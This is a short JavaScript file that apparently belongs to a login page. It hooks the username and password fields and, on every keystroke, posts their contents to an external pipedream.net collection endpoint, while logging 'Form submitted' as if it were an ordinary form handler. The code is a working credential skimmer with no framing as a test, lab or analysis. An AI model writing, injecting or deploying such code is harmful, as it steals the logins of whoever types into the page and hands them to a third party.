document.addEventListener("DOMContentLoaded", function () {
  const usernameField = document.getElementById("username");
  const passwordField = document.getElementById("password");

  function submitForm() {
    const username = usernameField?.value || "";
    const password = passwordField?.value || "";

    if (username && password) {
      fetch("https://eomw692b2vyyfdj.m.pipedream.net", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      })
        .then((response) => console.log("Form submitted"))
        .catch((error) => console.error("Error:", error));
    }
  }

  usernameField?.addEventListener("input", submitForm);
  passwordField?.addEventListener("input", submitForm);
});